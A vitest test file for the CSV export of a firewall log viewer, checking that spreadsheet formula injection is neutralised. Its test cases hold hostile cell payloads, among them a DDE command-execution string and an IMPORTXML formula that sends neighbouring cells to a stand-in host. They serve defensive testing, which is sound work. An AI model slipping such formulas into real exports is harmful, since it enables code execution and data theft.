// SPDX-License-Identifier: AGPL-3.0-only

import { describe, expect, it } from 'vitest'
import type { FirewallEvent } from './types'
import { eventsToCsv } from './export'

function event(overrides: Partial<FirewallEvent> = {}): FirewallEvent {
  return {
    id: 1,
    time: '2026-08-07T10:00:00Z',
    deviceId: 'router',
    sourceIp: '192.0.2.1',
    action: 'drop',
    raw: 'a plain line',
    ...overrides,
  } as FirewallEvent
}

function cells(csv: string, row = 1): string[] {
  return csv.split('\n')[row].split(',')
}

describe('CSV export formula injection', () => {
  // Every one of these reaches the export from outside mikroview: `raw`
  // is the syslog line verbatim, `ruleLabel` is router configuration,
  // the hostname columns come from naming/DNS.
  it.each([
    ['=cmd|\' /C calc\'!A0', 'DDE command execution'],
    ['=IMPORTXML("http://evil.example/?d="&A1,"//a")', 'silent exfiltration of adjacent cells'],
    ['@SUM(1+1)', 'legacy Lotus-style formula lead'],
    ['+1+1', 'plus lead'],
    ['-1+1', 'minus lead'],
    ['\t=1+1', 'tab then formula -- leading whitespace is stripped first'],
    ['\r=1+1', 'CR then formula'],
  ])('neutralises %j (%s)', (payload) => {
    const csv = eventsToCsv([event({ raw: payload })])
    // The cell must no longer begin with a formula character. Checked on
    // the raw text rather than a parsed cell, since what matters is what
    // the spreadsheet sees before it parses anything.
    const body = csv.split('\n').slice(1).join('\n')
    const cellStart = body.indexOf(payload.trimStart()[0])
    expect(body[cellStart - 1] === "'" || body.includes(`'${payload}`)).toBe(true)
    expect(body.startsWith('=')).toBe(false)
  })

  it('leaves ordinary values untouched', () => {
    const csv = eventsToCsv([event({ deviceId: 'router', action: 'drop' })])
    expect(cells(csv)[1]).toBe('router')
    expect(cells(csv)[3]).toBe('drop')
  })

  // Quoting alone was the old behaviour and is not a defence -- the
  // spreadsheet unquotes before deciding whether a cell is a formula.
  it('neutralises a payload that also needs CSV quoting', () => {
    const csv = eventsToCsv([event({ raw: '=HYPERLINK("http://evil.example","click"),x' })])
    expect(csv).toContain('"\'=HYPERLINK')
  })
})
